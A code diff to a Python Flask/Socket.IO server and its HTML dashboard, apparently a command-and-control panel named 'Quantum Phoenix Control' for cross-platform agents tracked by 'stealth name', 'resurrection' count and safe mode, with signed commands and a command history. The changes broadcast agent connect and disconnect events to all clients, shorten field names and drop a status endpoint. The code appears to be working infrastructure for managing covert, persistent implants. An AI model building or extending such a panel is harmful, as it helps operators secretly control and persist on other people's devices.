@@ -270,6 +270,7 @@ HTML = '''<!DOCTYPE html>
         });
 
         socket.on('phoenix_quantum', (data) => {
+            console.log('Phoenix connected:', data);
             if (!phoenixes.has(data.id)) {
                 phoenixes.set(data.id, data);
                 updatePhoenixDisplay();
@@ -316,8 +317,8 @@ HTML = '''<!DOCTYPE html>
                 
                 grid.innerHTML += `
                     <div class="phoenix-card ${safeClass}">
-                        <h3>${icon} ${phoenix.stealth_name || id}</h3>
-                        <div class="resurrection">RESURRECTIONS: ${phoenix.resurrections}</div>
+                        <h3>${icon} ${phoenix.s || id}</h3>
+                        <div class="resurrection">RESURRECTIONS: ${phoenix.r || 0}</div>
                         <div>STATUS: ${phoenix.safe ? '🛡️ SAFE MODE' : '⚡ QUANTUM MODE'}</div>
                         <div>PLATFORM: ${phoenix.platform}</div>
                         <div class="platform-badge">${phoenix.platform.toUpperCase()}</div>
@@ -325,7 +326,7 @@ HTML = '''<!DOCTYPE html>
                     </div>
                 `;
 
-                select.innerHTML += `<option value="${id}">${icon} ${phoenix.stealth_name || id} (${phoenix.platform})</option>`;
+                select.innerHTML += `<option value="${id}">${icon} ${phoenix.s || id} (${phoenix.platform})</option>`;
             });
 
             // Update platform commands when selection changes
@@ -464,18 +465,6 @@ def health_check():
         'timestamp': datetime.now().isoformat()
     }
 
-@app.route('/status')
-def status():
-    """Server status endpoint"""
-    return {
-        'server': 'Quantum Phoenix Control V4',
-        'version': '4.0',
-        'platforms_supported': ['android', 'linux', 'windows', 'macos'],
-        'active_connections': len(PHOENIX_REGISTRY),
-        'command_history_count': len(COMMAND_HISTORY),
-        'uptime': 'running'
-    }
-
 @socketio.on('quantum_command')
 def handle_quantum_command(data):
     """Handle signed quantum commands"""
@@ -510,6 +499,8 @@ def handle_disconnect():
         if sid == request.sid: 
             del PHOENIX_REGISTRY[pid]
             print(f"🔌 Phoenix disconnected: {pid}")
+            # Broadcast to all clients that phoenix disconnected
+            socketio.emit('phoenix_disconnected', {'id': pid})
 
 @socketio.on('phoenix_quantum')
 def handle_phoenix_quantum(data):
@@ -522,6 +513,10 @@ def handle_phoenix_quantum(data):
     print(f"   Resurrections: {data.get('r', 0)}")
     print(f"   Safe Mode: {data.get('safe', False)}")
     print(f"   Stealth Name: {data.get('s', 'unknown')}")
+    
+    # Broadcast to ALL clients that a new phoenix connected
+    socketio.emit('phoenix_quantum', data)
+    print(f"📢 Broadcasted phoenix connection to all clients")
 
 # For Railway deployment
 application = app
@@ -534,7 +529,6 @@ if __name__ == '__main__':
     print("🌐 Cross-platform support enabled")
     print("📊 Real-time monitoring ready")
     print(f"🏥 Health check: http://localhost:{port}/health")
-    print(f"📈 Status: http://localhost:{port}/status")
     print("=" * 50)
     
     socketio.run(app, host='0.0.0.0', port=port, debug=False, allow_unsafe_werkzeug=True)
